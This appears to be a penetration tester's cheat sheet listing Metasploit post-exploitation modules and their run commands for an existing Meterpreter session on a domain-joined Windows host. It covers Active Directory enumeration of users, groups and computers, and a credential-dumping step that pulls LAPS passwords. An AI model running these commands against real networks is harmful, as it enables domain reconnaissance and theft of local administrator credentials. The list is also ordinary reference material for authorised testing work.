# Metasploit - Meterpreter Session (Domain-Joined Machine)

## Enumeration

### 1) Build a targeted wordlist

    use post/windows/gather/enum_ad_to_wordlist

Execution

    set session NUM
    run

### 2) Enumerate all Domain Computers

    use post/windows/gather/enum_ad_computers

Execution

    set session NUM
    set FILTER (&(objectCategory=computer)(operatingSystem=*))
    run

### 3) Enumerate all Domain Groups

    use post/windows/gather/enum_ad_groups

Execution

    set session NUM
    run

### 4) Enumerate all Domain Users

    use post/windows/gather/enum_ad_users

Execution

    set session NUM
    run

### 5) Domain Information

    use post/windows/gather/enum_domain

Execution

    set session NUM
    run

## Credential Dumping

### 1) LAPS Passwords

    use post/windows/gather/credentials/enum_laps

Execution

    set session NUM
    run
